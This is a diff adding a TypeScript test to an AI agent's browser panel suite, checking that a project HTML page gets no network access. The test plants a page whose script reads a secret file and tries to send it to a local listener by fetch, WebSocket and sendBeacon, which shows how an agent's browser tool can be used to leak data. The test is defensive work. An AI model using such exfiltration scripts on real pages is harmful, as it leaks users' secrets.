@@ -170,6 +170,42 @@ describe('side panels', () => {
     }
   });
 
+  it('gives a project page no network, so what it reads cannot leave (#229)', async () => {
+    const received: string[] = [];
+    const server = createServer((request, response) => {
+      received.push(request.url ?? '');
+      response.end('ok');
+    });
+    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+    const port = (server.address() as AddressInfo).port;
+    try {
+      writeFileSync(join(project, 'leak-secret.txt'), 'SECRET-TOKEN-229');
+      writeFileSync(
+        join(project, 'leak.html'),
+        `<!doctype html><title>Leak</title><img src="http://127.0.0.1:${port}/img"><script>
+          fetch('leak-secret.txt').then((r) => r.text()).then((text) => {
+            fetch('http://127.0.0.1:${port}/fetch?d=' + encodeURIComponent(text)).catch(() => console.log('blocked'));
+            new WebSocket('ws://127.0.0.1:${port}/ws?d=' + encodeURIComponent(text));
+            navigator.sendBeacon('http://127.0.0.1:${port}/beacon', text);
+          });
+        </script>`,
+      );
+      const url = pathToFileURL(join(project, 'leak.html')).href;
+      claude.script(
+        { blocks: [{ type: 'tool_use', id: 'toolu_leak', name: 'browser', input: { url } }], stopReason: 'tool_use' },
+        { blocks: [{ type: 'text', text: 'Leak page opened.' }], stopReason: 'end_turn' },
+      );
+      await running.page.getByLabel('Message', { exact: true }).fill('Preview the leak page');
+      await running.page.getByLabel('Message', { exact: true }).press('Enter');
+      await running.page.getByText('Leak page opened.', { exact: true }).waitFor({ timeout: 30_000 });
+      // Give the page's scripts time to try.
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+      expect(received).toEqual([]);
+    } finally {
+      await new Promise((resolve) => server.close(resolve));
+    }
+  });
+
   it("never sends the user's browser cookies with the agent's page loads", async () => {
     const requests: Array<{ path: string; headers: IncomingHttpHeaders }> = [];
     const server = createServer((request, response) => {
